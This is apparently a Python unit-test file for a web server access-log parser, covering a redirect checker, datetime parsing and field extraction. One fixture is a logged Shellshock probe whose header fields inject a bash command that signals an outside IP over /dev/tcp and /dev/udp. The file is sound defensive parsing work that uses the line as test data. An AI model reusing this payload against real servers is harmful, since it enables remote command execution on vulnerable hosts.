#!/usr/bin/python
# -*- coding: utf-8 -*-
# UTF-8. That’s cool!
"""
LICENSE
Copyright (C) 2014-2015 Tellectual LLC

"""

import os.path
from datetime import datetime as dt

from twisted.python import failure
from twisted.internet import defer

from testbase import TestCase
import parse


ip1 = "221.127.9.141"
ip2 = "82.132.214.244"

NASTY_SHIT = """
2015-02-26 20:00:24+0000 [HTTPChannel,3229,68.116.30.102] 68.116.30.102 EVOLVINGOUTOFEDEN.ORG - [26/Feb/2015:20:00:24 +0000] "GET /cgi-bin/test-cgi HTTP/1.1" 302 234 "() { :;}; /bin/bash -c \"echo EVOLVINGOUTOFEDEN.ORG/cgi-bin/test-cgi > /dev/tcp/23.227.199.185/80; echo EVOLVINGOUTOFEDEN.ORG/cgi-bin/test-cgi > /dev/udp/23.227.199.185/80\"" "() { :;}; /bin/bash -c \"echo EVOLVINGOUTOFEDEN.ORG/cgi-bin/test-cgi > /dev/tcp/23.227.199.185/80; echo EVOLVINGOUTOFEDEN.ORG/cgi-bin/test-cgi > /dev/udp/23.227.199.185/80\"
""".strip()

TWISTED_MSG = """
2015-04-02 20:07:41+0000 [HTTPChannel,28192,216.99.158.78] Warning: HEAD request <HEAD /fckeditor/editor HTTP/1.1> for resource <twisted.web.resource.NoResource instance at 0x146fe18> is returning a message body.  I think I'll eat it.
"""


class TestRedirectChecker(TestCase):
    def setUp(self):
        self.rc = parse.RedirectChecker()

    def test_isRedirect(self):
        wasRD, vhost = self.rc("foo.com", ip1, 200)
        self.assertFalse(wasRD)
        self.assertEqual(vhost, "foo.com")
        wasRD, vhost = self.rc("foo.com", ip2, 302)
        self.assertFalse(wasRD)
        self.assertEqual(vhost, "foo.com")
        for k in xrange(10):
            wasRD, vhost = self.rc("bar.com", ip2, 200)
            self.assertTrue(wasRD)
            self.assertEqual(vhost, "foo.com")
        wasRD, vhost = self.rc("bar.com", ip1, 200)
        self.assertFalse(wasRD)
        self.assertEqual(vhost, "bar.com")


class TestParser(TestCase):
    def setUp(self):
        self.p = parse.LineParser()
        self.ipList = []

    def test_parseDatetimeBlock(self):
        textExpected = (
            ("20/Feb/2015:12:02:49 +0000", dt(2015, 2, 20, 12, 2, 49)),
            ("2/Jan/2015:21:17:16 +0000", dt(2015, 1, 2, 21, 17, 16)),
            ("07/Sep/2014:06:46:34 -0400", dt(2014, 9, 7, 6, 46, 34)))
        for text, dtExpected in textExpected:
            self.failUnlessEqual(self.p.parseDatetimeBlock(text), dtExpected)
            
    def test_calle(self):
        textExpected = (
            ('64.233.172.98 freedomtodoubt.com - [07/Sep/2014:06:46:34 -0400] '+\
             '"GET /ftd.css HTTP/1.1" 200 1238 "http://freedomtodoubt.com/" '+\
             '"Mozilla/5.0 (Linux; U; Android 4.3; en-us; SPH-L710 Build/JSS15J) '+\
             'AppleWebKit/534.30 (KHTML, like Gecko) '+\
             'Version/4.0 Mobile Safari/534.30"',
             ["freedomtodoubt.com",
              "64.233.172.98",
              dt(2014, 9, 7, 6, 46, 34),
              "/ftd.css",
              200,
              "http://freedomtodoubt.com/",
              "Mozilla/5.0 (Linux; U; Android 4.3; en-us; SPH-L710 Build/JSS15J) "+\
              "AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile " +\
              "Safari/534.30"]),
            (NASTY_SHIT,
             ["evolvingoutofeden.org",
              "68.116.30.102",
              dt(2015, 02, 26, 20, 0, 24),
              "/cgi-bin/test-cgi",
              302,
              "() { :;}; /bin/bash -c \"echo EVOLVINGOUTOFEDEN.ORG/cgi-bin/test-cgi "+\
              "> /dev/tcp/23.227.199.185/80; echo EVOLVINGOUTOFEDEN.ORG/cgi-bin/"+\
              "test-cgi > /dev/udp/23.227.199.185/80\"",
              "() { :;}; /bin/bash -c \"echo EVOLVINGOUTOFEDEN.ORG/cgi-bin/test-cgi "+\
              "> /dev/tcp/23.227.199.185/80; echo EVOLVINGOUTOFEDEN.ORG/cgi-bin/"+\
              "test-cgi > /dev/udp/23.227.199.185/80"])
        )
        for text, expected in textExpected:
            self.assertItemsEqual(self.p(text), expected)

    def test_call_nastyShit(self):
        for k in xrange(3):
            dtp = self.p(NASTY_SHIT)[2]
            self.assertEqual(dtp, dt(2015, 02, 26, 20, 0, 24))

    def test_call_bogus(self):
        self.assertNone(self.p("xxxx"))
        self.assertNone(self.p(TWISTED_MSG))
